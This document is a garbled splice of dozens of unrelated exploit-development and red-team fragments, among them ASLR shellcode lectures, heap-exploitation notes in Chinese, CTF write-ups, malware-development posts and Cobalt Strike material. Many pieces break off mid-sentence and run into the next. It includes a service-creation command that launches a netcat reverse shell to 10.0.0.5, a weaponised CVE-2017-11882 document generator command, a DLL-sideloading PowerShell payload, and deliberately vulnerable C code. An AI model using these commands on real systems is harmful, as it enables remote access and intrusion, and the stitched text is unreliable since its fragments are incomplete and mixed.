MDSec’s penetration# Shellcode injection with ASLR

In the previous [Lecture](../Lecture2/README.md) I talked about, injection of
shell code when the ASLR was disabled. ASLR allows randomization of
different segment address. So it's not very trivial to identify the buffer address. The address of buffer keep on changing with every run of the program. So when the return address points to the buffer address (that keeps on changing), putting the executable shell code in memory is not so easy.

To disable ALSR,
`echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`
To enable the same,
`echo "2" | sudo dd of=/proc/sys/kernel/randomize_va_space`

## MITRE ATT&CK Tactics


- Persistence

## Description


Establishes persistence by backdooring an existing IAM role, allowing it to be assumed from an external AWS account.

<span style="font-variant: small-caps;">Warm-up</span>: 

- Create an IAM role.

<span style="font-variant: small-caps;">Detonation</span>: 

- Update the assume role policy of the IAM role to backdoor it, making it accessible from an external, fictitious AWS account:

  "Version": "2# Python Deserialization

## Pickle

The following code is a simple example of using `cPickle` in order to generate an auth_token which is a serialized User object.

```python
import cPickle
from base64 import b64encode, b64decode

class User:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"
        self.rank     = "guest"

h = User()
auth_token = b64encode(cPickle.dumps(h))
print("Your Auth Token : {}").format(auth_token)
```

The vulnerability is introduced when a token is loaded from an user input. 

```python
new_token = raw_input("New Auth Token : ")
token = cPickle.loads(b64decode(new_token))
print "Welcome {}".format(token.username)
```

Defeating the Stack Based Buffer Overflow Prevention
Mechanism of
Microsoft Windows 2003 Server.
David Litchfield

8th
September 2003
Abstract
This paper presents several methods of bypassing the protection mechanism built into Microsoft’s
Windows 2003 Server that attempts to prevent the exploitation of stack based buffer overflows.
Recommendations about how to thwart these attacks are made where appropriate.
Introduction
Microsoft is committed to security. I've been playing with Microsoft products, as far as security is
concerned, since 1997 and in the past year and a half or two I've seen a marked difference with
some very positive moves made. In a way they had to. W

A gentle introduction to return-oriented programming
Hi,
As I have promised in [5]my last post I will start a series about
return-oriented programming. I start with a short introduction about
the topic. The introduction covers the origin of return-oriented
programming, describes what return-oriented programming is and ends
with a definition of return-oriented programming which I will use in
the future#[1]made0x78 Security Feed

Ghidra 从 XXE 到 RCE
2019-03-18
作者：腾讯安全玄武实验室 tomato, salt
0x00 背景
Ghidra是 NSA 发布的一款反汇编工具,它的发布引起了安全研究人员的极大兴趣。
有研究人员发现Ghidra在加载工程时会存在XXE，基于笔者之前对XXE漏洞利用研究发现，攻击者可以利用Java中的特性以及Windows操作
系统中NTLM认证协议的缺陷的组合来完成RCE。
0x01 技术细节
Java在使用内置类 sun.net.www.protocol.http.HttpURLConnection
发送HTTP请求遇到状态码为401的HTTP返回头时，会判断该页面要求使用哪种认证方式，若采用的NTLM认证则会自动使用当前用户凭据进行认证。
其根本原因在于Windows下的Java默认启用了透明NTLM认证，并且将所有由外部传入的URL地址都认为是可信的。如下面代码段所示

自 2004 后，`glibc malloc` GOT 获得加固，`unlink`技术被淘汰。但是很快在 2005 年，`Phantasmal Phatasmagoria` 带来了一系列针对堆一处利用的技术。

* The House of Prime：在调用函数 malloc 后，要求两个释放的堆块包含攻击者可控的 size 字段。
* The House of Mind：要求能够操作程序反复分配新的内存。
* The House of Force：要求能够重写 top chunk，并且存在一个可控 size 的 malloc 函数，最后还需要再调用另一个 malloc 函数。
* The House of Lore：不适用于我们的例程。
* The House of Spirit：假设攻击者可以控制一个释放块的指针，但是这个技术还不能使用。

# House of Mind

在这个技术里面攻击者戏使用自己构造的`arena`去戏弄`malloc glibc`。假的`arena` 以 unsorted bin 的 fd 是 free - 12 的 got 入口地址，因此漏洞程序在 free chunk 时 `free()` 的 got 入口被 shellcode 地址覆盖后，这时 free 被调 pbzip2 用 shellcode 就会被执#[1]GitHub

## Vulnerability

memcpy() buffer overflow

## Context

We find a binary with owner ```bonus2``` and SUID.
```
bonus1@RainFall:~$ ls -l
-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1
```
When run with no arguments it segfaults. with any number of random arguments it does nothing.
```
bonus1@RainFall:~$ ./bonus1
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 hi
bonus1@RainFall:~$
```

## Solution

Investigating with gdb we find only ```main()```, no other functions. ```main()``` calls ```memcpy()``` which is vulnerable to buffer overflow.

First ```main()``` reads the first argument ```n = atoi(argv[1])```, and exits the program if ```n``` not less than 10.//ianbeer
Many iOS/MacOS sandbox escapes/privescs due to unexpected shared memory-backed xpc_data objects

When XPC serializes large xpc_data objects it creates mach memory entry ports
to represent the memory region then transfers that region to the receiving process
by sending a send right to the memory entry port in the underlying mach message.

By crafting our own xpc message (or using an interposition library as this poc does)
we can pass different flags to mach_make_memory_entry_64 such that the memory entry
received by the target process actually represents a region of shared memory such that
when the xpc_data deserialization code maps the memory entry port the memory region remains

Proposed Windows 10 EAF/EMET "Bypass" for Reflective DLL Injection
Windows 10 Redstone 3 (Fall Creator's Update) is adding [5]Exploit
Guard, bringing EMET's Export Address Table Access Filtering (EAF)
mitigation, among others, to the system. We are still living in a
golden era of Windows exploitation and post-exploitation, compared to
the way things will be once the world moves onto Windows 10. This is a
mitigation that will need to be bypassed sooner or later.
EAF sets hardware breakpoints that check for legitimate access when the### Vulnserver.exe


> Vulnserver is a multithreaded Windows based TCP server that listens for client connections on port 9999 (by default) and allows the user to run a number of different commands that are vulnerable to various types of exploitable buffer overflows.

The Vulnerable code is the following one:
```c
void Function1(char *Input) {

char Buffer2S[140];

strcpy(Buffer2S, Input);

}

void Function2(char *Input) {

char Buffer2S[60];

strcpy(Buffer2S, Input);

}

void Function3(char *Input) {

char Buffer2S[2000];

strcpy(Buffer2S, Input);

}

void Function4(char *Input) {

char Buffer2S[1000];

}

Abstract
Return-to-user (ret2usr) attacks redirect corrupted kernel
pointers to data residing in user space. In response, sev-
eral kernel-hardening approaches have been proposed to
enforce a more strict address space separation, by pre-
venting arbitrary control flow transfers and dereferences
from kernel to user space. Intel and ARM also recently
introduced hardware support for this purpose in the form
of the SMEP, SMAP, and PXN processor features. Un-
fortunately, although mechanisms like the above prevent

Recently, I published a post on using [12]App Paths with sdclt.exe to
bypass UAC. You may remember that the App Path bypass required a file
on disk. Since sdclt.exe is out there, I figured I would publish
another bypass using that binary, only this one is fileless. I
mentioned it in my [13]previous post, but the [14]Vault7 leak confir#[1]Penetration Testing Lab » Feed [2]Penetration Testing Lab »

# Exercise 1 - Xpdf

For this exercize we will fuzz **Xpdf** PDF viewer. The goal is to find a crash/PoC for [**CVE-2019-13288**](https://www.cvedetails.com/cve/CVE-2019-13288/) in XPDF 3.02. 

<details>
  <summary>For more information about CVE-2019-13288 vulnerability, click me!</summary>
  --------------------------------------------------------------------------------------------------------
  
  **CVE-2019-13288** is a vulnerability that may cause an infinite recursion via a crafted file.
  
  Since each called function in a program allocates a stack frame on the stack, if a a function is recursively called so many times it can lead to stack memory exhaustion and program crash.
  
 As a# RM to MP3 Converter

Exploit to pop _calc.exe_ for RM to MP3 Converter v2.7.3.700 on Windows XP.

Note: executes shellcode in the stack; does **NOT** defeat DEP.

Tested on Windows XP SP3.

# Service Execution

## Execution

Creating an evil service with a netcat reverse shell:

{% code title="attacker@victim" %}
```csharp
C:\> sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
[SC] CreateService SUCCESS
C:\> sc start evilsvc
```
{% endcode %}

## Observations

The reverse shell lives under services.exe as expected:

![](../../.gitbook/assets/services-nc.png)

Windows security, application, Service Control Manager and sysmon logs provide some juicy details:

Malware development part 2 - anti dynamic analysis & sandboxes
Introduction
This is the second post of a series which regards development of
malicious software. In this series we will explore and try to implement
multiple techniques used by malicious applications to execute code,
hide from defenses and persist.
Previously, we’ve created basic Metasploit shellcode launcher in C++
and explored basic techniques which helped to lower detection rate of
the compiled executable - payload encoding/encryption, binary signing
with custom code-signing certificate and switching to x64 architecture.

Cloning RSA tokens with Frida
12 Dec 2019, 10:13
At work we are using [9]RSA SecurID for login to corporate services.
RSA provides software tokens which are mobile applications that
generate one-time passwords that change every minute or so. These
applications are closed source and they use proprietary protocol to
provision the token. This basically means that you are vendor locked-in
with something that relies on security through obscurity.
I wanted to have an open-source implementation of RSA SecurID and until
now I have been using [10]stoken toge## Jenkins Ansible Tower Plugin - Information disclosure vulnerability

Hello and welcome back to part 2 of this 2-part tutorial about heap
spraying. This tutorial will walk you through precision heap spraying
on IE8. There are two basic cases where you will need to be extremely
precise with your heap spray: (1) You have to deal with DEP in which
case you need to be able to redirect executi# Exercise 8 - Adobe Reader

For this exercise, we will fuzz **Adobe Reader** application. The goal is to find an Out-of-bounds vulnerability in Adobe Reader 9.5.1.

## What you will learn
Once you complete this exercise you will know:
- How to use AFL++'s QEMU mode to fuzz closed-source applications
- How to enable persistent mode in QEMU mode
- How to use QASAN, a binary-only sanitizer

## Read Before Start
- I suggest you try to **solve the exercise by yourself** without checking the solution. Try as hard as you can, and only if you get stuck, check out the example solution below.
- AFL uses a non-deterministic testing algorithm, so two fuzzing sessions are never the same. That's why I hi#[1]Penetration Testing Lab » Feed [2]Penetration Testing Lab »

CVE-2017-11882利用
发表于 2017-11-21 | 分类于 [10]奇技淫巧
最近这段时间CVE-2017-11882挺火的。关于这个漏洞可以看看这里:[11]隐藏17年的Office远程代码执行漏洞POC样本分析（CV
E-2017-11882）。
今天在twitter上看到有人共享了一个POC，[12]twitter地址，[13]poc地址，后来又看到有人共享了一个项目[14]CVE-2
017-11882，简单看了一下这个项目，通过对rtf文件的修改来实现命令执行的目的，但是有个缺陷就是，这个项目使用的是使用webdav的方式
来执行远程文件的，使用起来可能并不容易，所以就对此文件进行了简单的修改，具体项目地址如下：GIT：[15]CVE-2017-11882 。
使用方式很简单，如果要执行命令

python Command_CVE-2017-11882.py -c "cmd.exe /c calc.exe" -o test.doc
demo

关于怎么进一步利用，可以参考之前写的[16]《windows命令执行漏洞不会玩？
看我！》，由于有长度的限制，这里可以采用mshta的方式来执行。构造的命令如下：

From fuzzing to 0-day
Written on May 14, 2014
A couple of days ago, I found an interesting bug during a fuzzing
session that led to me creating a 0-day exploit for it. I’ve been asked
a few times about the methods I use to find bugs and write exploits, so
I’ve decided to take this opportunity to describe one particular
workflow I use. In this post, I’ll take you through finding a bug,
analzying it, and creating a functional exploit.
In order to benefit from this post, you should be familiar with basic
fuzzing and exploit development.

At this point you're probably used to hunting through binaries for useful functions or code that you can use to get a shell. But what do you do without a call to `system()`?

The simple answer: get a shell anyways. :)

The long answer is a bit more complicated. This attack is called a "Return to `libc`", or `ret2libc` for short. If you don't remember the PLT and GOT from before, now is a good time to check the [glossary](../terms) and maybe do some googling. You'll recall that ASLR randomizes the libc address, but the good news is that with arbitrary `read()` and `write()` calls, you can easily circumvent this.

It would be helpful to be familiar with the x86 calling conventions
before reading this tutorial. I prepared a brief primer [14]here and
you are encouraged to learn more on your own.
How do format strings vulnerabilities work?
Format string vulnerabilities are a pretty silly class of bug that take
advantage of an easily avoidable programmer error. If the programmer

Public Key Infrastructure can be difficult to set up. Users and
administrators are often not fully aware of the implications of ticking
a single checkbox — especially when The exploit I have here will most lijeky not work if it is copy and pasted without reconfiguring it. Let's take a look at the source code...

```
#include <stdio.h>
#include <string.h>

void nothing()
{
	char* buf0[50];
	gets(buf0);
}

int main()
{
	printf("There, now you have less than nothing. Yet you still try. Some would recogmedn a psychologist. I recogmend natural selection\n");
	nothing();
}
```

So looking at this code, it looks pretty similar to the previous challenge. In fact it is pretty much just a copy and paste of the last challenge. However it is missing one thing that made our lives easy. It is no longer printing out the address of the buffer, so we will have to find that our#[1]GitHub

Reversing and Exploiting ARM Binaries: rwthCTF Trafman
As ARM is becoming more and more popular, the need to reverse engineer
ARM binaries is increasing as well. For example, nearly all mobile
phones have at least one ARM processor. In this post I show how to set
up a virtual ARM environment using Qemu, give an introduction to ARM
assembly (while highlighting the differences with x86), show how to
reverse ARM binaries, and finally demonstrate how to wr[1][logo.png]

versions of Windows in an attempt to give the reader a practical
working knowledge of how the unlink process works and how flink/blink
from freelist[n] can be controlled to give the attacker an arbitrary
write 4 primitive.

# 0x00 beginning

这个 post 主要记录学习 32 位 linux 下堆溢出使用的 unlink 技术, 依赖到`ptmalloc2`那部分的知识, 实验主要取自 [^orgin], 更多理论来自 [^phrack] 与 [^internal].

## prepare

存在堆溢出的代码

```c
#include <stdlib.h>
#include <string.h>

int main( int argc, char * argv[] )
{
        char * first, * second;

/*[1]*/ first = malloc( 666 );
/*[2]*/ second = malloc( 12 );
        if(argc!=1)
/*[3]*/         strcpy( first, argv[1] );
/*[4]*/ free( first );
/*[5]*/ free( second );
/*[6]*/ return( 0 );
}
```

代码很容易读懂, 就是从命令行读取第二个参数 (argv[1]) 不加校验复制到缓冲区 first, 如果 argv[1] 所指的字符串大于 666 字节就会在堆空间发生溢出, 具体会覆盖掉下一个`chunk header`, 这可能会导任意代码执行.

As a C++ programmer I am well aware of memory errors such as buffer
overflows and dangling pointers. There are a lot of good debugging
tools available like Memcheck in Valgrind and Address Sanitizer in GCC
and Clang which help identifying the root cause leading to the memory
corruption. But memory errors are not just bugs resulting in crashes or
incorrect program behavior. They are potentially severe security
issues. To better undeLet's take a look at the source code...

```
#include <stdio.h>
#include <string.h>

void nothing()
{
	char* buf0[50];
	printf("%p\n", &buf0);
	gets(buf0);
}

int main()
{
	printf("Even if you do hack this elf, what are you going to do?. You should really get back to research.\n");
	nothing();
}
```

So we can see that it suffers from the same buffer overflow vulnerabillity as the rest. However unlike the previous levels, there isn't anywhere in here that will print out "Level Cleared!". So we will have to somehow pop a shell and read the "out file". What we can do, is we can push our own shellcode (shellcode is precompiled assembly code that you can push onto a program of the same architectBlind Return Oriented Programming (BROP)
When hacking software, there are three exploit scenarios:
1. Open-source (e.g., Apache)
2. Open-binary (e.g., Internet Explorer)
3. Closed-binary and source (e.g., some proprietary network service)
This work studies whether it is possible to attack the third case.
The BROP attack makes it possible to write exploits without possessing
the target's binary. It requires a stack overflow and a service that
restarts after a crash. Based on whether a service crashes or not
(i.e., connection closes or stays open), the BROP attack is able to
construct a full remote exploit that leads to a shell. The BROP attack
remotely leaks enough gadgets to perform the writ#[1]The Vault - Atom [2]The Vault - RSS [3]The Vault - Atom

Apr 10, 2017
Do you still have telnet enabled on your Catalyst switches? Think
twice, here’s a proof-of-concept remote code execution exploit for
Catalyst 2960 switch with latest suggested firmware. Check out the
exploit code [6]here. What follows is a detailed write-up of the
exploit development process for the vulnerability leaked from CIA’s
archive on March 7th 2017 and publicly disclosed by Cisco Systems on
March 17th 2017. At the time of writing this post there is no patch
available. Nonetheless there is a remediation - disable telnet and use
SSH instead.

0x01.漏洞描述
Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。
Apache Shiro
1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Co
okie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。
漏洞产生原因：
shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值-->
Base64解码-->AES解密-->反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。
payload 构造
恶意命令-->序列化-->AES加密-->base64编码-->发送cookie
在整个漏洞利用过程中，比较重要的是AES加密的密钥，该秘钥默认是默认硬编码的，所以如果没有修改默认的密钥，就自己可以生成恶意构造的cookie
了。
漏洞影响版本：Apache Shiro <= 1.2.4
shiro特征：
* 未登陆的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段
* 登陆失败的话，不管勾选RememberMe字段没有，返回包都会[1]Dhaval Kapil

FILE Structure Exploitation ('vtable' check bypass)
Jan 12, 2018 • Dhaval Kapil
Introduction
‘FILE’ structure exploitation is one of the common ways to gain control
over execution flow. The attacker overwrites a ‘FILE’ pointer (say
stdin, stdout, stderr or any other file handler opened by fopen()) to
point to his/her own forged structure. This structure contains vtable,
which is a pointer to a table which contains functions which are called
when the original ‘FILE’ pointer is used to perform different
operations (such as fread, fwrite, etc.). However, checks have recently
been incorporated in libc that place a restriction on vtable to p# Red Teaming Toolkit

This repository contains cutting-edge open-source security tools (OST) that will help you during adversary simulation and as information intended for threat hunter can make detection and prevention control easier. The list of tools below that could be potentially misused by threat actors such as APT and Human-Operated Ransomware (HumOR). If you want to contribute to this list send me a pull request.

最近我们通过蜜罐捕获到一例Windows平台的恶意样本，该样本是通过IRC服务器和C2进行通讯的一种IRC
Bot。这种C2通讯方式的恶意程序已经屡见不鲜，但这次这个样本的特别之处在于它包含了非常猥琐的沙箱对抗机制，当样本正常运行的时候和普通的IRC
Bot并没有什么-两样，但是当将它放在沙箱里面的时候会发现沙箱根本捕获不到任何恶意行为，从而逃过检#[1]Penetration Testing Lab » Feed [2]Penetration Testing Lab »

Most information is in the blogpost: https://zeus.ugent.be/blog/22-23/reverse_engineering_epaper/

This is a voltage glitching exploit tool that works against the CC2510, and probably also against other CCxxxx Texas Instruments wireless chips that contain an 8051 core and the ChipCon debugging protocol.

It runs on a Raspberry Pi Pico chip. To start working on an exploit for your device, get a development board (or a spare device) and run the following steps on a separate computer, without moving or touching the board the CC2510 chip is on too much:

Some universal gadget sequence for Linux x86_64 ROP payload
Unlike x86, x86_64 ROP payload needs the parameters to function call in
registers. __libc_csu_init functions provides a few nice gadgets to
load data into certain critical registers. Most importantly EDI, RSI
and RDX. This is the sample code:

Understanding Buffer Overflow Exploits
The first time that I had to work with a buffer overflow exploit, I was
completely out of my depth. Although I could build networks and
configure firewalls, proxies, and intrusion detection systems without
breaking a sweat, exploit coding was a whole new world to me. However,
as with any complex or difficult concept, breaking it down into
manageable pieces proved to be an effective strategy.
After conducting research and following tutorials, the concepts and
tools started to become less confusing and the details #[1]Corelan Cybersecurity Research » Feed [2]Corelan Cybersecurity

Making AMSI Jump
[2]Rasta Mouse
Jun 16, 2020
5 min read
Since 3.13, Cobalt Strike has had a Malleable C2 option called
amsi_disable. This directive tells Beacon to patch the AmsiScanBuffer
function in the host process prior to injecting post-ex capabilities
such as powerpick and execute-assembly. This limits AMSI’s visibility
of said process and (hopefully) prevents the PowerShell / .NET
assemblies being executed from being scanned.
One set of workflows that amsi_disable does not apply to, are the new
(as of 4.0) jump commands.

Attempt to spawn a session on a remote t# PHP Object injection

PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.

The following magic methods will help you for a PHP Object injection

A few weeks ago I have published an article about WINRAR 0DAY.
That article revealed a new vulnerability that gave attackers, the
ability to perform spoofing attack.
Many people wrote to me about the problems of that kind of article
([5]for example).
So this time I’m goanna reveal a new 0DAY that will help security
managers to protect their web sites against many vulnerability scans.
A lot of sites owners will tell you that the majority numbers of scans,
performed against their sites, are performed by automatic tools like
NESSUS, ACUNETIX, and APPSCAN.

[9]Exploit Dev 101: Bypassing ASLR on Windows
Note: This post is quite theoretical (yuk!) but I’ll work on providing
a hands-on demo sometime in the future. Also given the current
mitigations in Windows, you’ll need much more than bypassing ASLR
What is ASLR?
Address space layout randomization (ASLR) is a memory protection
techniques that tries to prevent an attacker from creating a reliable
exploit. What it does is simple, a binary is loaded at a different base
address in memory upon restart (or reboot for OS dlls). It also
randomizes the Low Level Exploits

successfully run Cobalt Strike undetected on various endpoints during

Fuzzing workflows; a fuzz job from start to finish
By [12]@BrandonPrry
Many people have garnered an interest in fuzzing in the recent years,
with easy-to-use frameworks like American Fuzzy Lop showing incredible
promise and (relatively) low barrier to entry. Many websites on the
internet give brief introductions to specific features of AFL, how to
start fuzzing a given piece of software, but never what to do when you
decide to stop fuzzing (or how you decide in the first place?).

Exploit Development, Part 3: Finding Vulnerabilities by Fuzzing with Spike
Updated: Dec 31, 2022
Often, as part of the exploit development process, we will want to test
an application for vulnerabilities, especially [4]buffer overflows. One
of the ways we can do that is to send random, varying length, invalid
data at the application and see what happens. If we can get the
application to crash, this often is a sign of a vulnerability that we
can then develop an exploit for later.

[11]Introduction to Linux shellcode writing (Part 1)
[12]31 August, 201525 August, 2015[13]Adrian Citu
Introduction
This is very brief and basic list of steps to follow if you want to
write a shellcode under Linux operating system.
1. Craft the shellcode
The first step and by far the most important one is to find a
vulnerab## s a n d s i f t e r 
: the x86 processor fuzzer

### Overview

The sandsifter audits x86 processors for hidden instructions and hardware bugs,
by systematically generating machine code to search through a processor's
instruction set, and monitoring execution for anomalies. Sandsifter has
uncovered secret processor instructions from every major vendor; ubiquitous
software bugs in disassemblers, assemblers, and emulators; flaws in enterprise
hypervisors; and both benign and security-critical hardware bugs in x86 chips.

With the multitude of x86 processors in existence, the goal of the tool is to
enable users to check their own systems for hidden instructions and bugs.

In late 2001, "Vudo Malloc Tricks" and "Once Upon A free()" defined
the exploitation of overflowed dynamic memory chunks on Linux. In
late 2004, a series of patches to GNU libc malloc implemented over
a dozen mandatory integrity assertions, effectively rendering the
existing techniques obsolete.

result, more and more organizations are turning to a combination of

As many testers will know, achieving C2 communication can sometimes be
a pain. Whether because of egress firewall rules or process
restrictions, the simple days of reverse shells and reverse HTTP C2
channels are quickly coming to an end.
OK, maybe I exaggerated that a bit, but it’s certainly becoming harder.
So, I wanted to look at some alternate routes to achieve C2
communication and with this, I came across Cobalt Strike’

Abstract—We show that it is possible to write remote stack

Empire Domain Fronting
So Domain Fronting seems to be the hot topic as of late. This will be
short, and I won’t repeat information in regards to what Domain
Fronting is and how it can be used to abuse high trust domains. For
detailed explanations and examples, please look over [4]this white
paper, as well as an excellent blog [5]post from Vincent Yiu. For
additional information, you can also take a look at another [6]post or
this [7]video by Raphael Mudge for implementation with Cobalt Strike.
The setup process for Domain Fronting in Empire is simple. Most of the
overhead will be required during the configuration of your chosen CDN.

## [Description from ATT&CK](https://attack.mitre.org/techniques/T1574/008)
<blockquote>Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.

Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Ord#[1]OffSec » Feed [2]OffSec » Comments Feed [3]alternate [4]alternate

背景
2018年10月18日，360威胁情报中心首次捕获到一例利用Excel 4.0宏传播Imminent
Monitor远控木马的在野攻击样本。而这离2018年10月6日国外安全厂商Outflank的安全研究人员首次公开使用Excel
4.0宏执行ShellCode的利用代码仅仅过去了10余天。虽然Excel
4.0宏技术已经发布超过20年，并且在该技术出现早期就被经常用于制作宏病毒，但事实上，由于Microsoft很早就使用VBA宏（Visual
Basic for Applications）来代替Excel 4.0宏技术，这导致Excel 4.0宏并不为大众所熟知。并且由于Excel
4.0宏存放在Excel 97 – 2003格式（.xls，复合二进制文件格式）的Workbook

First, generate the unique string, locate the EIP value, and locate it's exact offset.This directory contains sample exploit build code for CVE-2021-35982, a DLL sideloading privilege escalation flaw
in Adobe Reader.

These scripts are designed to run on a modern Linux system.  They cross-compile a DLL using the i686-w64-mingw32-gcc binary,
which can be installed through the gcc-mingw-w64-i686 package on Debian/Ubuntu based systems.

`./gen.sh` will generate an exploit DLL in the `build/` directory.

For convenience, we've attached a pre-generated DLL which will execute the payload: 

```
powershell -command echo DLL sideloading successful as $(whoami) > C:\pwned
```

In exploit development, an Egg is a full shellcode payload that usually
has a nop sled at the beginning. The start of the payload (usually the
nop sled) will have a particular signature that we will use to identify
where our shellcode is placed in memory. Sometime you can’t know

to steal credentials from KeePass.
According to their website, Frida is a “dynamic instrumentation
framework”. Essentially, it allows us to inject into a running process
then interact with that process via JavaScript. It’s commonly used for
mobile app testing, but is supported on Windows, OSX and *Nix as well.

Weaponization of a JavaScriptCore Vulnerability

__________________________________________________________________
Software bugs come in many shapes and sizes. Sometimes, these code
defects (or ‘asymmetries’) can be used to compromise the runtime
integrity of software. This distinction is what helps researchers
separate simple [7]reliability issues from [8]security vulnerabilities.
At the extreme, certain vulnerabilities can be weaponized by
meticulously exacerbating such asymmetries to rPwn2Own 2010 Windows 7 Internet Explorer 8 exploit
I decided to write a quick document about the techniques I used to exploit Internet Explorer 8 on
windows 7 with ASLR and DEP enabled.
The exploit consists of two parts.
The first part figures out where a certain .dll file is loaded in the current process followed by step 2 that
uses the information gathered in step 1 to trigger an exploit that uses some ret2lib technique to disable
DEP for our shellcode and then redirects the program flow to the shellcode.
I will not (and am not allowed to) give out the exact vulnerabilities that I used in the exploit, but I might
disclose them someday when Microsoft has them patched. Yes, you read that cor[1]Get Started Free|[2]Contact Sales:[3]+1 (888) 993-5273

DCShadow
They told me I could be anything I wanted ... So I became a domain
controller
Beware that pushing data using replication can brick your domain
(although we never did it while developing DCShadow)
Executive Summary
DCShadow is a new feature in [1]mimikatz located in the [2]lsadump
module. It simulates the behavior of a Domain Controller (using
protocols like RPC used only by DC) to inject its own data, bypassing
most of the common security controls and including your SIEM. It shares
some similarities with the DCSync attack (already present in the
lsadump module of mimikatz).
As a reminder a Domain Controller is a server controlling an "Active
Directory", a shared authenROPLevel4 created by Billy Ellis (@bellis1000)

This goal of this exploit exercise is to call the secret() function by exploiting a classic stack buffer overflow. Sounds simple? Yes... but this level has ASLR enabled.

ASLR randomises the address space of the program every time it is run. Using an address found from a static analysis of the binary will not be enough to complete this challenge as the address of secret() will change each time you execute the program.

To assist you, ROPLevel4 will give you an info leak so you don't have to think about discovering your own. It will leak the address of a string stored in the binary, but will not tell you the address of secret().

protections in windows when exploiting a heap overflow. Today, however,
I have a very special surprise. Today we are not going to cover another
heap overflow attack technique, but rather learn how to exploit a

============

-   You must submit your homework using this Latex template.

-   This homework is graded out of 70 points. Point values are
    associated to each question.

Questions
=========

1.  (5 points) Explain the principle of w-⊗-x as a way to protect
    against stack smashing attacks that load shell code.

2.  (5 points) What `gcc` compilation is used to **tunr off** w-xor-x?

3.  (5 points) What is a return-to-libc attack?

4.  (5 points) What c-library function is typically called when
    performing a return-to-libc attack? Why do we choose this one?

5.  (5 points) Explain the **error** output and how we know that this
    was a successful exploit.

- <code>server_0</code>: this server was compiled to have ASLR enables but not PIE. We can user buffer overflow to inject a ROP chain in order to call the write function a second time, 
giving it the address of the got. This reveals the entry of the got corresponding to setsockopt. By computing the offset of the function inside libc (using nm -D), the libc base
address can be obtained. Once we know that address, we can let ropper generate a chain for executing a shell.

Exploiting the macOS WindowServer for root
Four Heap Sprays, Two Dangling Pointers, One Bitflip
August 28, 2018 / [4]Markus Gaasedelen
__________________________________________________________________
As the sixth and final post of our Pwn2Own 2018 series, we document the
long and twisted road of weaponizing CVE-2018-4193 to exploit the macOS
WindowServer. Serving as a memory-corruption based privilege escalation
to root, this was used as a zero-day to escape the Safari sandbox on
macOS 10.13.3.
First, we will describe the constraints of our discovered
vulnerability. We then cover the tools and techniques used to discover

Ntpdc Local Buffer Overflow
Jan 6th, 2015
Alejandro Hdez (@nitr0usmx) recently [6]tweeted about a trivial buffer
overflow in ntpdc, a deprecated NTP query tool still available and
packaged with any NTP install. He posted a screenshot of the crash as
the result of a large buffer passed into a vulnerable gets call. After
digging into it a bit, I decided it’d be a fun exploit to write, and it
was. There are a few quarks to it that make it of particular interest,
of which I’ve detailed below.
As noted, the bug is the result of a vulnerable gets, which can be
crashed with the following:

# Crafting Malicious Pluggable Authentication Modules for Persistence, Privilege Escalation, and Lateral Movement

## Synopsis

Since its inception in 1997, PAM (Pluggable Authentication Modules) have served as a library for enabling local system administrators to choose how individual applications authenticate users. A PAM module is a single executable binary file that can be loaded by the PAM interface library, which is configured locally with a system file, `/etc/pam.conf`, to authenticate a user request via the locally available authentication modules. The modules themselves will usually be located in the directory `/lib/security` or the `/usr/lib64/security` directory depending on archi#[1]XPN InfoSec Blog

So, I wanted to look at some alternate routes to achieve C2

From fuzzing to 0-day
Written on May 14, 2014
A couple of days ago, I found an interesting bug during a fuzzing
session that led to me creating a 0-day exploit for it. I’ve been asked
a few times about the methods I use to find bugs and write exploits, so
I’ve decided to take this opportunity to describe one particular
workflow I use. In this post, I’ll take you through finding a bug,
analzying it, and creating a functional exploit.
In order to benefit from this post, you should be familiar with basic
fuzzing and exploit development.

[4]An introduction to exploiting userspace race conditions on iOS
by Brandon Azad November 9, 2018
Let’s walk through the discovery and exploitation of [5]CVE-2018-4331,
a race condition in the com.apple.GSSCred XPC service that could be
used to execute arbitrary code inside the GSSCred process, which runs
as root on macOS and iOS. The exploit, [6]gsscred-race, targets iOS
11.2, although versions up through iOS 11.4.1 are vulnerable. This post
will show how I discovered the bug, how I analyzed its exploitability,
and how I developed a JOP program that allowed me to take control of
the process.

## [Description from ATT&CK](https://attack.mitre.org/techniques/T1036/006)
<blockquote>Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.

For example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing app#[1]Penetration Testing Lab » Feed [2]Penetration Testing Lab »

Sigreturn Oriented Programming is a real Threat
Rémi Mabon1
Abstract: This paper shows that Sigreturn Oriented Programming (SROP), which consists of using
calls to sigreturn to execute arbitrary code, is a powerful method for the development of exploits.

Bypassing Linux' NULL pointer dereference exploit prevention (mmap_min_addr)
EDIT3: [5]Slashdot, the [6]SANS Institute, [7]Threatpost and others
have a story about [8]an exploit by Bradley Spengler which uses our
technique to exploit a null pointer dereference in the Linux kernel.
